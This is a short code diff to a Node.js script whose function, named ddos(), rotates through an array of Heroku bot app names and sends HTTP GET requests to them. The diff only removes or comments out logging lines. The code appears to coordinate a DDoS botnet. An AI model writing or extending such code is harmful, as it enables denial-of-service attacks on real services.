@@ -22,7 +22,6 @@ var count=0;
 function ddos(){
 
     const uril="http://"+botArray[count]+".herokuapp.com?index="+count+"count=3"
-    console.log(uril)
     count=count+4;
     if(count>=botArray.length) count=0;
     http.get(uril, {headers:{ 'User-Agent': 'Node Server' }},(resp) => {
@@ -35,7 +34,7 @@ function ddos(){
       
         // The whole response has been received. Print out the result.
         resp.on('end', () => {
-            console.log(pythonData + botArray[count-4])
+            // console.log(pythonData + botArray[count-4])
         });
       
       }).on("error", (err) => {
